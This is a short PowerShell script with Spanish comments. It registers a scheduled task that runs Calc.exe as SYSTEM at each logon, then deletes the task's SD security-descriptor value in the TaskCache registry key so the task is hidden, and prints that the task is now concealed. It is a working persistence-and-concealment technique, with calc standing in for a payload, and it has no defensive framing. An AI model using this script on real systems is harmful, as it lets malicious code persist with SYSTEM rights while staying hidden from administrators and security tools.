# Crear una tarea programada

$taskName = "Calc_PS1"
$action = New-ScheduledTaskAction -Execute Calc.exe
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Interactive
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal

# Eliminar el valor SD para ocultar la tarea
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Calc_PS1"
$value = "SD"

$fullKeyPath = Join-Path -Path $regPath -ChildPath $value
Remove-ItemProperty -Path $regPath -Name $value -Force
Write-Host "El valor SD de la tarea programada ha sido eliminado"
Write-Host "Ahora la tarea se encuentra oculta"